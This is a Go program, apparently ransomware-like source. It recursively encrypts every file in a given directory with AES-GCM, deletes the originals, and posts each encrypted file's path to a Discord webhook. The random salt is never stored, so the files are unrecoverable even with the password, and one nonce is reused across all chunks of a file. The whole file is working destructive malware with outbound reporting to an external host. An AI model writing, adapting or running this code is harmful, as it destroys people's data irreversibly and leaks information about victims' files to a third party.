package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"

	"golang.org/x/crypto/pbkdf2"
)

const (
	saltSize   = 16
	keySize    = 32
	iterations = 100000
	bufferSize = 4096
	webhookURL = "YOUR_DISCORD_WEBHOOK_URL"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Printf("Usage: %s <DIRECTORY> <PASSWORD>\n", os.Args[0])
		os.Exit(1)
	}

	dir := os.Args[1]
	password := os.Args[2]

	salt := make([]byte, saltSize)
	if _, err := rand.Read(salt); err != nil {
		fmt.Println("Error generating salt:", err)
		os.Exit(1)
	}

	key := pbkdf2.Key([]byte(password), salt, iterations, keySize, sha256.New)

	var wg sync.WaitGroup
	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if !info.IsDir() {
			wg.Add(1)
			go func(path string) {
				defer wg.Done()
				if err := encryptFile(path, key); err != nil {
					sendDiscordNotification(fmt.Sprintf("Failed to encrypt %s: %v", path, err))
				} else {
					sendDiscordNotification(fmt.Sprintf("Successfully encrypted %s", path))
				}
			}(path)
		}

		return nil
	})

	wg.Wait()

	if err != nil {
		fmt.Println("Error walking through directory:", err)
		sendDiscordNotification("Error walking through directory: " + err.Error())
	} else {
		fmt.Println("Encryption completed.")
		sendDiscordNotification("Encryption completed successfully.")
	}
}

func encryptFile(filePath string, key []byte) error {
	inputFile, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("error opening file: %w", err)
	}
	defer inputFile.Close()

	outputFile, err := os.Create(filePath + ".enc")
	if err != nil {
		return fmt.Errorf("error creating output file: %w", err)
	}
	defer outputFile.Close()

	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("error creating cipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("error creating GCM: %w", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return fmt.Errorf("error generating nonce: %w", err)
	}

	if _, err := outputFile.Write(nonce); err != nil {
		return fmt.Errorf("error writing nonce: %w", err)
	}

	buffer := make([]byte, bufferSize)
	for {
		n, err := inputFile.Read(buffer)
		if err != nil && err != io.EOF {
			return fmt.Errorf("error reading plaintext: %w", err)
		}
		if n == 0 {
			break
		}

		ciphertext := gcm.Seal(nil, nonce, buffer[:n], nil)
		if _, err := outputFile.Write(ciphertext); err != nil {
			return fmt.Errorf("error writing ciphertext: %w", err)
		}
	}

	return os.Remove(filePath)
}

func sendDiscordNotification(message string) {
	webhookMessage := map[string]string{
		"content": message,
	}

	jsonMessage, _ := json.Marshal(webhookMessage)
	req, _ := http.NewRequest("POST", webhookURL, bytes.NewBuffer(jsonMessage))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending message to Discord webhook:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNoContent {
		fmt.Printf("Discord webhook returned status code: %d\n", resp.StatusCode)
	}
}
